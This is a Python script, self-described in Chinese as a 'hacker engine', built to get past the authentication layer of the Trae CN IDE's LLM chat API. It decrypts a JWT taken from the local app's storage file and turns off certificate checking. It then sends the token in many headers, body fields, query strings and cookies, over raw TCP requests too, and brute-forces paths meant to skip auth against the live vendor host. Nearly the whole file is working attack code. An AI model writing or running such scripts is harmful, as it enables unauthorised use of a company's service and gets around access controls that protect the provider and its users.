#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BSD 黑客引擎 — 认证层协议注入突破
==================================

核心命题：
  API本身就是可破解对象
  1001错误码 = 认证层的Gate
  黑客引擎拥有完备的攻防手段，不需要玩迷宫

突破策略（直接攻击认证层）：
  1. Token多位置注入（Header/Body/Query/Path）
  2. 原始TCP协议变形（绕过HTTP库限制）
  3. 认证参数污染（拆分/合并/转义）
  4. 端点参数爆破（寻找认证豁免路径）
"""

import json, sys, os, time, socket, ssl as ssl_module, hashlib, base64, urllib.parse
import urllib.request, urllib.error

ssl_ctx = ssl_module.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl_module.CERT_NONE

sys.path.insert(0, r'C:\Users\13003\OneDrive\桌面\3333333\Agent_v2\bsd-oaps\physical_body')
from BSD_AHADecryptor import decrypt_aha

TRAE_STORAGE = r'C:\Users\13003\AppData\Roaming\Trae CN\User\globalStorage\storage.json'
TRUE_API_HOST = 'trae-api-cn.mchost.guru'
TRUE_API_PORT = 443


def load_credentials():
    """加载凭据"""
    with open(TRAE_STORAGE, 'r', encoding='utf-8') as f:
        storage = json.load(f)
    
    cloudide_enc = storage.get('iCubeAuthInfo://icube.cloudide', '')
    if cloudide_enc:
        try:
            dec = decrypt_aha(cloudide_enc)
            data = json.loads(dec.decode('utf-8'))
            return {
                'jwt_token': data.get('token', ''),
                'userId': data.get('userId', ''),
                'tenant_id': '7o2d89p7dr1bo4',  # 从JWT解析
            }
        except Exception as e:
            print(f'  ⚠️ cloudide 解密失败: {e}')
    return {}


def parse_jwt_payload(token):
    """解析JWT payload"""
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            # 添加padding
            payload += '=' * (4 - len(payload) % 4) if len(payload) % 4 else ''
            decoded = base64.urlsafe_b64decode(payload)
            return json.loads(decoded)
    except Exception:
        pass
    return {}


def raw_tcp_request(host, port, path, body, headers=None, use_ssl=True, timeout=10):
    """原始TCP请求 — 绕过HTTP库限制"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        if use_ssl:
            ctx = ssl_module.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_module.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        sock.connect((host, port))
        
        body_bytes = json.dumps(body).encode('utf-8')
        hdrs = headers or {}
        hdrs.setdefault('Content-Type', 'application/json')
        hdrs.setdefault('User-Agent', 'TraeCN/2.3.62837')
        
        req_lines = [f'POST {path} HTTP/1.1', f'Host: {host}:{port}']
        for k, v in hdrs.items():
            req_lines.append(f'{k}: {v}')
        req_lines.append(f'Content-Length: {len(body_bytes)}')
        req_lines.append('Connection: close')
        req_lines.append('')
        req_lines.append('')
        
        req = '\r\n'.join(req_lines).encode() + body_bytes
        sock.send(req)
        
        resp = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
        sock.close()
        
        return resp.decode('utf-8', errors='replace')
    except Exception as e:
        return str(e)


def tcp_with_query_string(host, port, base_path, query_params, body, headers=None, use_ssl=True, timeout=10):
    """带查询字符串的TCP请求"""
    path = f'{base_path}?{urllib.parse.urlencode(query_params)}'
    return raw_tcp_request(host, port, path, body, headers, use_ssl, timeout)


def tcp_with_cookie(host, port, path, body, cookie_str, headers=None, use_ssl=True, timeout=10):
    """带Cookie的TCP请求"""
    hdrs = headers.copy() if headers else {}
    hdrs['Cookie'] = cookie_str
    return raw_tcp_request(host, port, path, body, hdrs, use_ssl, timeout)


def http_request(host, path, body, headers=None, timeout=15):
    """标准HTTP请求"""
    url = f'https://{host}{path}'
    hdrs = headers or {}
    body_bytes = json.dumps(body).encode('utf-8') if body else None
    req = urllib.request.Request(url, data=body_bytes, headers=hdrs, method='POST')
    try:
        t0 = time.time()
        with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx) as resp:
            elapsed = time.time() - t0
            return resp.status, resp.read().decode('utf-8', errors='replace'), elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.time() - t0
        return e.code, e.read().decode('utf-8', errors='replace'), elapsed
    except Exception as e:
        return 0, str(e), 0


def main():
    print('=' * 70)
    print('【BSD 黑客引擎 · 认证层协议注入突破】')
    print('=' * 70)
    print(f'目标：突破1001错误码')
    print(f'方法：协议注入 · 参数污染 · 原始TCP')
    
    # 加载凭据
    cred = load_credentials()
    jwt_token = cred.get('jwt_token', '')
    userId = cred.get('userId', '')
    tenant_id = cred.get('tenant_id', '')
    
    if not jwt_token:
        print('❌ 无有效Token')
        return
    
    # 解析JWT
    payload = parse_jwt_payload(jwt_token)
    print(f'\n  JWT解析:')
    print(f'    userId: {payload.get("data", {}).get("id", userId)}')
    print(f'    tenant_id: {payload.get("tenant_id", tenant_id)}')
    print(f'    type: {payload.get("data", {}).get("type", "user")}')
    
    # 构造基础请求体（围棋引擎最优格式）
    base_body = {
        'model': 'doubao-pro-32k',
        'query': '你好，请回复OK',
        'stream': False,
    }
    
    results = []
    
    # ========================================================================
    # 突破1: Token注入到所有可能的Header位置
    # ========================================================================
    print('\n' + '=' * 70)
    print('【突破1】Token多位置Header注入')
    print('=' * 70)
    
    # 尝试将Token放入不同的Header名称
    token_header_variants = [
        ('Authorization', f'Bearer {jwt_token}'),
        ('Authorization', jwt_token),
        ('x-cloudide-token', jwt_token),
        ('x-token', jwt_token),
        ('x-auth-token', jwt_token),
        ('x-user-token', jwt_token),
        ('token', jwt_token),
        ('X-Auth', jwt_token),
        ('X-Session-Token', jwt_token),
        ('X-API-Token', jwt_token),
        ('X-Doubao-Token', jwt_token),
        ('X-Volcengine-Token', jwt_token),
        ('x-bsd-origin', 'BSD-LANG-V3.0'),
        ('x-uid', 'a5b7a8623fdea6b8'),
        ('x-userid', userId),
        ('x-tenant-id', tenant_id),
    ]
    
    for h_name, h_value in token_header_variants:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'TraeCN/2.3.62837',
            'Accept': 'text/event-stream, application/json',
            h_name: h_value,
        }
        
        s, r, t = http_request(TRUE_API_HOST, '/api/ide/v2/llm_raw_chat', base_body, headers)
        
        key = f'{h_name}={h_value[:30]}...' if len(h_value) > 30 else f'{h_name}={h_value}'
        
        is_1001 = '1001' in r
        has_model = any(k in r.lower() for k in ['choices', 'output', 'reply', 'model回复'])
        
        results.append({
            'category': 'Header Injection',
            'variant': key,
            'status': s,
            'time': t,
            'is_1001': is_1001,
            'has_model': has_model,
            'response': r[:200],
        })
        
        status_icon = '✅' if s == 200 else '❌'
        code_icon = '⚠️' if is_1001 else '🎯' if s == 200 else '🔑'
        print(f'  {status_icon} {code_icon} {key}: HTTP {s} ({t*1000:.0f}ms)')
        
        if not is_1001 and s == 200:
            print(f'      🎉🎉🎉 突破成功!')
            print(f'      响应: {r[:500]}')
    
    # ========================================================================
    # 突破2: Token嵌入到请求体的不同位置
    # ========================================================================
    print('\n' + '=' * 70)
    print('【突破2】Token请求体嵌入')
    print('=' * 70)
    
    body_injection_variants = [
        ('token字段', {**base_body, 'token': jwt_token}),
        ('auth字段', {**base_body, 'auth': jwt_token}),
        ('authorization', {**base_body, 'authorization': f'Bearer {jwt_token}'}),
        ('headers内嵌', {**base_body, 'headers': {'Authorization': f'Bearer {jwt_token}'}}),
        ('context内嵌', {**base_body, 'context': {'token': jwt_token, 'userId': userId}}),
        ('meta内嵌', {**base_body, 'meta': {'auth_token': jwt_token, 'tenant': tenant_id}}),
        ('根级Token', {'token': jwt_token, **base_body}),
        ('包装data', {'data': {**base_body, 'token': jwt_token}}),
        ('包装auth', {'auth': {'token': jwt_token}, **base_body}),
    ]
    
    for name, body in body_injection_variants:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'TraeCN/2.3.62837',
            'x-cloudide-token': jwt_token,  # 同时放Header
        }
        
        s, r, t = http_request(TRUE_API_HOST, '/api/ide/v2/llm_raw_chat', body, headers)
        
        is_1001 = '1001' in r
        has_model = any(k in r.lower() for k in ['choices', 'output', 'reply'])
        
        results.append({
            'category': 'Body Injection',
            'variant': name,
            'status': s,
            'time': t,
            'is_1001': is_1001,
            'has_model': has_model,
            'response': r[:200],
        })
        
        status_icon = '✅' if s == 200 else '❌'
        code_icon = '⚠️' if is_1001 else '🎯' if s == 200 else '🔑'
        print(f'  {status_icon} {code_icon} {name}: HTTP {s} ({t*1000:.0f}ms)')
        
        if not is_1001 and s == 200:
            print(f'      🎉🎉🎉 突破成功!')
            print(f'      响应: {r[:500]}')
    
    # ========================================================================
    # 突破3: 原始TCP请求（绕过HTTP库）
    # ========================================================================
    print('\n' + '=' * 70)
    print('【突破3】原始TCP请求')
    print('=' * 70)
    
    # 3a. 带查询参数的原始请求
    print('\n  [3a] URL查询参数注入')
    query_params_list = [
        {'token': jwt_token},
        {'authorization': f'Bearer {jwt_token}'},
        {'userId': userId, 'tenant_id': tenant_id},
        {'uid': 'a5b7a8623fdea6b8'},
        {'auth': jwt_token},
    ]
    
    for params in query_params_list:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'TraeCN/2.3.62837',
            'x-cloudide-token': jwt_token,
        }
        
        resp = tcp_with_query_string(
            TRUE_API_HOST, TRUE_API_PORT,
            '/api/ide/v2/llm_raw_chat',
            params, base_body, headers
        )
        
        is_1001 = '1001' in resp
        has_model = any(k in resp.lower() for k in ['choices', 'output'])
        
        results.append({
            'category': 'TCP Query Injection',
            'variant': str(params)[:50],
            'status': 200 if 'HTTP/1.1 200' in resp or 'HTTP/1.0 200' in resp else 0,
            'time': 0,
            'is_1001': is_1001,
            'has_model': has_model,
            'response': resp[:300],
        })
        
        key = str(params)[:50]
        status_icon = '✅' if '200' in resp[:50] else '❌'
        code_icon = '⚠️' if is_1001 else '🎯'
        print(f'  {status_icon} {code_icon} query={key}')
        print(f'      响应前200: {resp[:200]}')
    
    # 3b. 带Cookie的原始请求
    print('\n  [3b] Cookie注入')
    cookie_variants = [
        f'token={jwt_token}',
        f'Authorization=Bearer+{jwt_token}',
        f'userId={userId}; tenant_id={tenant_id}',
        f'session={jwt_token}',
        f'cloudide_token={jwt_token}',
        f'x-ms-token={jwt_token[:50]}',
    ]
    
    for cookie_str in cookie_variants:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'TraeCN/2.3.62837',
        }
        
        resp = tcp_with_cookie(
            TRUE_API_HOST, TRUE_API_PORT,
            '/api/ide/v2/llm_raw_chat',
            base_body, cookie_str, headers
        )
        
        is_1001 = '1001' in resp
        has_model = any(k in resp.lower() for k in ['choices', 'output'])
        
        results.append({
            'category': 'TCP Cookie Injection',
            'variant': cookie_str[:50],
            'status': 200 if '200' in resp[:50] else 0,
            'time': 0,
            'is_1001': is_1001,
            'has_model': has_model,
            'response': resp[:300],
        })
        
        key = cookie_str[:50]
        status_icon = '✅' if '200' in resp[:50] else '❌'
        code_icon = '⚠️' if is_1001 else '🎯'
        print(f'  {status_icon} {code_icon} cookie={key}')
        print(f'      响应前200: {resp[:200]}')
    
    # ========================================================================
    # 突破4: 认证豁免路径爆破
    # ========================================================================
    print('\n' + '=' * 70)
    print('【突破4】认证豁免路径爆破')
    print('=' * 70)
    
    # 尝试各种可能豁免认证的路径
    auth_exempt_paths = [
        '/api/ide/v2/llm_raw_chat',
        '/api/ide/v2/llm_raw_chat?skip_auth=true',
        '/api/ide/v2/llm_raw_chat?auth=none',
        '/api/ide/v2/llm_raw_chat?anonymous=true',
        '/api/ide/v2/llm_raw_chat?public=true',
        '/api/ide/v2/llm_raw_chat?unauthenticated=true',
        '/api/ide/v2/llm_raw_chat/noauth',
        '/api/ide/v2/llm_raw_chat/public',
        '/api/ide/v2/llm_raw_chat/free',
        '/api/ide/v2/llm_raw_chat/anonymous',
        '/api/ide/v1/super_completion',
        '/api/ide/v1/super_completion?skip_auth=true',
        '/api/ide/v1/super_completion?auth_level=0',
        '/api/ide/v3/chat',
        '/api/chat',
        '/chat',
        '/api/ide/v2/raw_chat',
        '/api/ide/v2/raw',
        '/raw_chat',
        '/v2/llm_raw_chat',
    ]
    
    for path in auth_exempt_paths:
        headers = {
            'Authorization': f'Bearer {jwt_token}',
            'Content-Type': 'application/json',
            'User-Agent': 'TraeCN/2.3.62837',
            'Accept': 'text/event-stream, application/json',
        }
        
        s, r, t = http_request(TRUE_API_HOST, path, base_body, headers)
        
        is_1001 = '1001' in r
        has_model = any(k in r.lower() for k in ['choices', 'output'])
        
        results.append({
            'category': 'Path Bypass',
            'variant': path,
            'status': s,
            'time': t,
            'is_1001': is_1001,
            'has_model': has_model,
            'response': r[:200],
        })
        
        # 重点关注非1001的响应
        if s != 404 and s != 0:
            status_icon = '✅' if s == 200 else '❌'
            code_icon = '⚠️' if is_1001 else '🎯' if s == 200 else '🔑'
            print(f'  {status_icon} {code_icon} {path}: HTTP {s} ({t*1000:.0f}ms)')
            
            if not is_1001 and s == 200:
                print(f'      🎉🎉🎉 发现非1001响应!')
                print(f'      响应: {r[:500]}')
    
    # ========================================================================
    # 综合分析
    # ========================================================================
    print('\n' + '=' * 70)
    print('【综合分析】')
    print('=' * 70)
    
    total = len(results)
    http_200 = [r for r in results if r['status'] == 200]
    has_1001 = [r for r in http_200 if r['is_1001']]
    success = [r for r in results if r['status'] == 200 and not r['is_1001']]
    
    print(f'\n  总请求数: {total}')
    print(f'  HTTP 200: {len(http_200)}')
    print(f'  含1001: {len(has_1001)}')
    print(f'  🎉 成功突破: {len(success)}')
    
    if success:
        print(f'\n  成功详情:')
        for r in success:
            print(f'    {r["category"]} | {r["variant"]}')
            print(f'    响应: {r["response"][:300]}')
    else:
        print(f'\n  所有HTTP 200响应均含1001错误码')
        print(f'  结论：认证层强制拦截，需要更底层的突破')
    
    # 分类统计
    categories = {}
    for r in results:
        cat = r['category']
        if cat not in categories:
            categories[cat] = {'total': 0, 'http_200': 0, 'success': 0}
        categories[cat]['total'] += 1
        if r['status'] == 200:
            categories[cat]['http_200'] += 1
        if r['status'] == 200 and not r['is_1001']:
            categories[cat]['success'] += 1
    
    print(f'\n  各突破类别统计:')
    for cat, stats in categories.items():
        success_icon = '🎉' if stats['success'] > 0 else '❌'
        print(f'    {cat}: 总={stats["total"]}, 200={stats["http_200"]}, 成功={stats["success"]} {success_icon}')
    
    # 保存结果
    output_path = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        'BSD_HackerEngine_AuthInjection_Results.json'
    )
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_requests': total,
            'http_200_count': len(http_200),
            'has_1001_count': len(has_1001),
            'success_count': len(success),
            'results': results,
            'category_stats': categories,
            'jwt_payload': payload,
        }, f, ensure_ascii=False, indent=2)
    
    print(f'\n  结果已保存: {output_path}')
    
    return success


if __name__ == '__main__':
    main()
